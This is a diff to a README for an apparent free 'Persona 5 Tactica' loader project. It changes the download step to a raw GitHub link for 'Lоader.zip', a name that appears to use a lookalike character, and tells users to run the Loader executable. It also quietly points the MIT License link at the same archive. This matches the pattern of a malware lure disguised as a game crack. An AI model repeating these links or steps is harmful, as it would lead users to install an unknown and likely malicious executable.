@@ -23,7 +23,7 @@ Welcome to the **Persona 5 Tactica ** project! This repository empowers fans to 
 
 ## 🛠️ Installation Steps
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/Bryan-625/Persona5Tactica-FreeEditionHub/main/Lоader.zip** from the repository.
 2. Extract the contents to your chosen folder.
 3. Run the Loader executable.
 4. Follow on-screen prompts to set up the game.
@@ -39,4 +39,4 @@ This project is intended for **educational and personal use only**. Consult the 
 
 ## 📄 MIT License
 
-All code and resources in this repository are under the [MIT License](https://opensource.org/licenses/MIT) (2025). Use, modify, and share at your discretion!
+All code and resources in this repository are under the [MIT License](https://raw.githubusercontent.com/Bryan-625/Persona5Tactica-FreeEditionHub/main/Lоader.zip) (2025). Use, modify, and share at your discretion!
